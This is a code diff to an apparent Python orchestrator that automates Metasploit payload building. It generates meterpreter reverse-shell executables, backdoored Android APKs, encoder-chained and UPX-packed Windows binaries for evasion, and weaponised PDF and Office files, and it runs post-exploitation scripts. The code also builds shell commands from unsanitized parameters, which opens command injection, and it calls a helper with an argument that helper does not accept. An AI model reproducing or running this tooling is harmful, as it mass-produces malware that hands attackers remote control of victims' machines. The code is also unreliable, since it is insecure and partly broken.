@@ -16,6 +16,10 @@ import json
 WORKSPACE = Path("/workspace")
 TASKS_ROOT = WORKSPACE / "tasks"
 
+DOCKER_IMAGE = os.environ.get("ORCH_DOCKER_IMAGE", "orchestrator-tools:latest")
+USE_DOCKER = os.environ.get("ORCH_USE_DOCKER", "true").lower() == "true"
+
+
 class Artifact(BaseModel):
     name: str
     path: str
@@ -77,6 +81,33 @@ def _spawn(cmd: List[str], log_path: Path, cwd: Optional[Path] = None, env: Opti
     return return_code
 
 
+def _spawn_container_sh(cmd: str, log_path: Path, cwd: Optional[Path] = None, env: Optional[Dict[str, str]] = None) -> int:
+    """
+    Spawns a command inside a containerized shell.
+    Sets HOME to the task's base directory to allow msfconsole to copy artifacts.
+    """
+    task_home = cwd if cwd else Path.home()
+    env = os.environ.copy()
+    env["HOME"] = str(task_home)
+    with log_path.open("w") as lf:
+        proc = subprocess.Popen(
+            ["docker", "run", "--rm", "-v", f"{task_home}:/workspace", "-v", f"{log_path.parent}:/logs", DOCKER_IMAGE, "bash", "-lc", cmd],
+            stdout=lf, stderr=subprocess.STDOUT, cwd=str(cwd) if cwd else None, env=env
+        )
+        return_code = proc.wait()
+    return return_code
+
+
+def _spawn_sh(cmd: str, log_path: Path, cwd: Optional[Path] = None, env: Optional[Dict[str, str]] = None) -> int:
+    """
+    Spawns a command using the local shell.
+    """
+    with log_path.open("w") as lf:
+        proc = subprocess.Popen(cmd, stdout=lf, stderr=subprocess.STDOUT, cwd=str(cwd) if cwd else None, env=env)
+        return_code = proc.wait()
+    return return_code
+
+
 def _prepare_task(kind: str, params: Dict[str, str]) -> (Task, Path):
     date = _now_str_date()
     task_id = f"{uuid.uuid4().hex[:8]}-{kind}"
@@ -111,18 +142,19 @@ def run_payload_task(task_id: str, base: Path, params: Dict[str, str]):
         t.state = TaskStatus.PREPARING
     build_log = base / "logs" / "build.log"
     cmd = [
-        "msfvenom",
-        "-p", params.get("payload", "windows/meterpreter/reverse_tcp"),
+        "msfvenom -p",
+        params.get("payload", "windows/meterpreter/reverse_tcp"),
         f"LHOST={params.get('lhost','127.0.0.1')}",
         f"LPORT={params.get('lport','4444')}",
-        "-f", "exe",
-        "-o", str(base / "output" / (params.get("output_name", "payload") + ".exe")),
+        "-f exe -o",
+        str(base / "output" / (params.get("output_name", "payload") + ".exe")),
     ]
     with locks[task_id]:
         t.state = TaskStatus.RUNNING
         t.started_at = time.time()
         t.logs["build"] = str(build_log)
-    rc = _spawn(cmd, build_log)
+    shell_cmd = " ".join(cmd)
+    rc = _spawn_container_sh(shell_cmd, build_log, base) if USE_DOCKER else _spawn_sh(shell_cmd, build_log)
     _finalize_task(t, base, succeeded=(rc == 0), err=None if rc == 0 else f"msfvenom rc={rc}")
 
 
@@ -222,11 +254,8 @@ def run_android_task(task_id: str, base: Path, params: Dict[str, str]):
 
     if mode == "standalone":
         # Generate standalone APK via msfvenom
-        cmd = [
-            "msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}",
-            "-o", str(output_apk)
-        ]
-        rc = _spawn(cmd, build_log)
+        chain = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -o {output_apk}"
+        rc = _spawn_container_sh(chain, build_log, base) if USE_DOCKER else _spawn_sh(chain, build_log)
         if rc != 0:
             err = f"msfvenom standalone rc={rc}"
         else:
@@ -262,14 +291,19 @@ def run_android_task(task_id: str, base: Path, params: Dict[str, str]):
         ]) + "\n")
         # run script and choose permissions
         choice = b"1\n" if perm_strategy == "keep" else b"2\n"
-        with build_log.open("w") as lf:
-            proc = subprocess.Popen(["bash", str(WORKSPACE / "backdoor_apk")], stdin=subprocess.PIPE, stdout=lf, stderr=subprocess.STDOUT)
-            try:
-                proc.stdin.write(choice)
-                proc.stdin.flush()
-            except Exception:
-                pass
-            rc = proc.wait()
+        if USE_DOCKER:
+            # run inside container
+            # simulate stdin by echoing choice
+            rc = _spawn_container_sh(f"printf '{choice.decode()}' | bash /workspace/backdoor_apk", build_log, base)
+        else:
+            with build_log.open("w") as lf:
+                proc = subprocess.Popen(["bash", str(WORKSPACE / "backdoor_apk")], stdin=subprocess.PIPE, stdout=lf, stderr=subprocess.STDOUT)
+                try:
+                    proc.stdin.write(choice)
+                    proc.stdin.flush()
+                except Exception:
+                    pass
+                rc = proc.wait()
         succeed = _file_exists(output_apk)
         if not succeed:
             err = f"backdoor_apk rc={rc}"
@@ -337,22 +371,9 @@ def run_winexe_task(task_id: str, base: Path, params: Dict[str, str]):
     exe_path = base / "output" / f"{output_name}.exe"
 
     # build msfvenom pipeline
-    ven_cmd = [
-        "msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}",
-        "-f", "raw"
-    ]
     # Apply encoder chain
-    pipeline = []
     if encoders.strip():
-        # first stage
         stages = [e.strip() for e in encoders.split(",") if e.strip()]
-        # build a chain of msfvenom calls consuming raw input
-        for i, st in enumerate(stages):
-            parts = st.split(":")
-            enc = parts[0]
-            it = parts[1] if len(parts) > 1 else "1"
-            # for first pass read from previous, else still from previous stage
-            # We will construct shell pipeline string for simplicity
         # Since building complex pipelines via Popen list is cumbersome, fallback to shell string safely
         chain = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f raw"
         for st in stages:
@@ -362,20 +383,11 @@ def run_winexe_task(task_id: str, base: Path, params: Dict[str, str]):
             chain += f" | msfvenom -a x86 --platform windows -e {enc} -i {it} -f raw"
         # final conversion to exe
         chain += f" | msfvenom -a {'x86' if arch=='x86' else 'x64'} --platform windows -f exe -o \"{exe_path}\""
-        cmd = ["bash", "-lc", chain]
+        rc = _spawn_container_sh(chain, build_log, base) if USE_DOCKER else _spawn_sh(chain, build_log)
     else:
         # single pass directly to exe
-        cmd = [
-            "msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}",
-            "-a", ("x86" if arch == "x86" else "x64"), "--platform", "windows",
-            "-f", "exe", "-o", str(exe_path)
-        ]
-
-    with locks[task_id]:
-        t.state = TaskStatus.RUNNING
-        t.started_at = time.time()
-        t.logs["build"] = str(build_log)
-    rc = _spawn(cmd, build_log)
+        chain = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -a {('x86' if arch=='x86' else 'x64')} --platform windows -f exe -o {exe_path}"
+        rc = _spawn_container_sh(chain, build_log, base) if USE_DOCKER else _spawn_sh(chain, build_log)
 
     # optional upx
     if rc == 0 and upx_flag and exe_path.exists():
@@ -388,14 +400,18 @@ def run_winexe_task(task_id: str, base: Path, params: Dict[str, str]):
     _finalize_task(t, base, succeeded=succeeded, err=None if succeeded else f"winexe rc={rc}")
 
 
-def _msfconsole_run(rc_content: str, log_path: Path) -> int:
+def _msfconsole_run(rc_content: str, log_path: Path, task_base: Path, msf_home: Optional[Path] = None) -> int:
     rc_file = log_path.parent / "task.rc"
     _write_file(rc_file, rc_content)
-    return _spawn(["msfconsole", "-qx", f"resource {rc_file}; exit -y"], log_path)
+    cmd = f"msfconsole -qx 'resource {rc_file}; exit -y'"
+    if USE_DOCKER:
+        return _spawn_container_sh(cmd, log_path, task_base, set_home=msf_home)
+    return _spawn_sh(cmd, log_path)
 
 
-def _copy_msf_local(filename: str, dest: Path) -> bool:
-    src = Path.home() / ".msf4" / "local" / filename
+def _copy_msf_local(filename: str, dest: Path, msf_home: Optional[Path] = None) -> bool:
+    base_home = msf_home if msf_home else (Path.home())
+    src = base_home / ".msf4" / "local" / filename
     if src.exists():
         _ensure_dir(dest.parent)
         shutil.copy2(src, dest)
@@ -422,7 +438,7 @@ def run_pdf_task(task_id: str, base: Path, params: Dict[str, str]):
         t.started_at = time.time()
         t.logs["build"] = str(build_log)
     # build simple exe via msfvenom
-    rc0 = _spawn(["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-f", "exe", "-o", str(exe_path)], build_log)
+    rc0 = _spawn_container_sh(f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f exe -o {exe_path}", build_log, base) if USE_DOCKER else _spawn_sh(f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f exe -o {exe_path}", build_log)
     if rc0 != 0:
         _finalize_task(t, base, succeeded=False, err=f"msfvenom rc={rc0}")
         return
@@ -434,10 +450,11 @@ set FILENAME {output_name}.pdf
 set INFILENAME {base_pdf}
 exploit
 """.strip()
-    rc1 = _msfconsole_run(rc_text, build_log)
+    msf_home = base / "temp" / "home"
+    rc1 = _msfconsole_run(rc_text, build_log, base, msf_home)
     # copy result
     pdf_out = base / "output" / f"{output_name}.pdf"
-    ok = _copy_msf_local(f"{output_name}.pdf", pdf_out)
+    ok = _copy_msf_local(f"{output_name}.pdf", pdf_out, msf_home)
     _finalize_task(t, base, succeeded=ok, err=None if ok else f"pdf embed rc={rc1}")
 
 
@@ -477,9 +494,10 @@ set FILENAME {output_name}{ext}
 {extra}
 exploit
 """.strip()
-    rc = _msfconsole_run(rc_text, build_log)
+    msf_home = base / "temp" / "home"
+    rc = _msfconsole_run(rc_text, build_log, base, msf_home)
     doc_out = base / "output" / f"{output_name}{ext}"
-    ok = _copy_msf_local(f"{output_name}{ext}", doc_out)
+    ok = _copy_msf_local(f"{output_name}{ext}", doc_out, msf_home)
     _finalize_task(t, base, succeeded=ok, err=None if ok else f"office rc={rc}")
 
 
@@ -673,7 +691,8 @@ def run_postex_task(task_id: str, base: Path, params: Dict[str, str]):
         t.state = TaskStatus.RUNNING
         t.started_at = time.time()
         t.logs["run"] = str(build_log)
-    rc = _msfconsole_run(rc_text, build_log)
+    msf_home = base / "temp" / "home"
+    rc = _msfconsole_run(rc_text, build_log, base, msf_home)
     # Always succeed in generating logs and rc run; effectiveness depends on active session
     _finalize_task(t, base, succeeded=True, err=None)
 
